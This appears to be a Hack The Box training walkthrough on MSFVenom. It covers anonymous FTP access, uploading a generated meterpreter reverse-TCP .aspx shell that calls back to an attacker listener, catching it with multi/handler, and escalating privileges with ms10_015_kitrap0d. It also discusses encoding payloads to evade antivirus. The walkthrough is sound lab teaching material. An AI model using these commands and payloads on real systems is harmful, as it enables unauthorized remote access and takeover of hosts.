<h3>Introduction to MSFVenom</h3>

MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole to provide users with highly customizable and hard-to-detect payloads for their exploits.

MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, which contained multiple encoding schemes used both for removing bad characters from shellcode (this could sometimes cause instability during the runtime), and for evading older Anti-Virus (AV) and endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.

Nowadays, the two combined tools offer penetration testers a method to quickly craft payloads for different target host architectures and releases while having the possibility to 'clean up' their shellcode so that it does not run into any errors when deployed. The AV evasion part is much more complicated today, as signature-only-based analysis of malicious files is a thing of the past. Heuristic analysis, machine learning, and deep packet inspection make it much harder for a payload to run through several subsequent iterations of an encoding scheme to evade any good AV software. As seen in the Payloads module, submitting a simple payload with the same configuration detailed above yielded a hit rate of 52/65. In terms of Malware Analysts worldwide, that is a Bingo. (It is still unproven that Malware Analysts worldwide actually say "that is a Bingo".)

<h3>Creating Our Payloads</h3>

Let's suppose we have found an open FTP port that either had weak credentials or was open to Anonymous login by accident. Now, suppose that the FTP server itself is linked to a web service running on port tcp/80 of the same machine and that all of the files found in the FTP root directory can be viewed in the web-service's /uploads directory. Let's also suppose that the web service does not have any checks for what we are allowed to run on it as a client.

Suppose we are hypothetically allowed to call anything we want from the web service. In that case, we can upload a PHP shell directly through the FTP server and access it from the web, triggering the payload and allowing us to receive a reverse TCP connection from the victim machine.

<h3>Scanning the Target</h3>

@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5

<SNIP>
  
PORT   STATE SERVICE VERSION

21/tcp open  ftp     Microsoft ftpd

80/tcp open  http    Microsoft IIS httpd 7.5

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<h3>FTP Anonymous Access</h3>


Name (10.10.10.5:root): anonymous

331 Anonymous access allowed, send identity (e-mail name) as password.


Password: ******

230 User logged in.
Remote system type is Windows_NT.


ftp> ls


200 PORT command successful.

125 Data connection already open; Transfer starting.

03-18-17  02:06AM       <DIR>          aspnet_client

03-17-17  05:37PM                  689 iisstart.htm

03-17-17  05:37PM               184946 welcome.png

226 Transfer complete.

Noticing the aspnet_client, we realize that the box will be able to run .aspx reverse shells. Luckily for us, msfvenom can do just that without any issue.

<h3>Generating Payload</h3>

@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

[-] No arch selected, selecting arch: x86 from the payload

No encoder or badchars specified, outputting raw payload

Payload size: 341 bytes

Final size of aspx file: 2819 bytes

htb[/htb]$ ls

Desktop  Documents  Downloads  my_data  Postman  PycharmProjects  reverse_shell.aspx  Templates

Now, we only need to navigate to http://10.10.10.5/reverse_shell.aspx, and it will trigger the .aspx payload. Before we do that, however, we should start a listener on msfconsole so that the reverse connection request gets caught inside it.

<h3>MSF - Setting Up Multi/Handler</h3>

@htb[/htb]$ msfconsole -q 

msf6 > use multi/handler

msf6 exploit(multi/handler) > show options

  Name  Current Setting  Required  Description
  
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   
   --  ----
   
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.10.14.5

LHOST => 10.10.14.5


msf6 exploit(multi/handler) > set LPORT 1337

LPORT => 1337


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:1337 

Module options (exploit/multi/handler):

<h3>Executing the Payload</h3>

Now we can trigger the .aspx payload on the web service. Doing so will load absolutely nothing visually speaking on the page, but looking back to our multi/handler module, we would have received a connection. We should ensure that our .aspx file does not contain HTML, so we will only see a blank web page. However, the payload is executed in the background anyway.

<img width="996" height="600" alt="image" src="https://github.com/user-attachments/assets/5f886d1c-068b-4f72-9011-98a247dd1b22" />

<h3>MSF - Meterpreter Shell</h3>

<img width="988" height="362" alt="image" src="https://github.com/user-attachments/assets/b5a6f52a-7da1-4c10-84a9-41b30ffa65c5" />

If the Meterpreter session dies too often, we can consider encoding it to avoid errors during runtime. We can pick any viable encoder, and it will ultimately improve our chances of success regardless.

<h3>MSF - Searching for Local Exploit Suggester</h3>

<img width="980" height="843" alt="image" src="https://github.com/user-attachments/assets/8520ba8f-4275-4c41-8dcb-9c845d834af8" />

Having these results in front of us, we can easily pick one of them to test out. If the one we chose is not valid after all, move on to the next. Not all checks are 100% accurate, and not all variables are the same. Going down the list, bypassauc_eventvwr fails due to the IIS user not being a part of the administrator's group, which is the default and expected. The second option, ms10_015_kitrap0d, does the trick.



<h3>MSF - Local Privilege Escalation</h3>

<img width="995" height="896" alt="image" src="https://github.com/user-attachments/assets/52e52fd6-c5bd-49eb-8763-6ef12f767cee" />

<img width="983" height="405" alt="image" src="https://github.com/user-attachments/assets/13e6af1a-c42f-413a-ae73-9884ffe3ab78" />
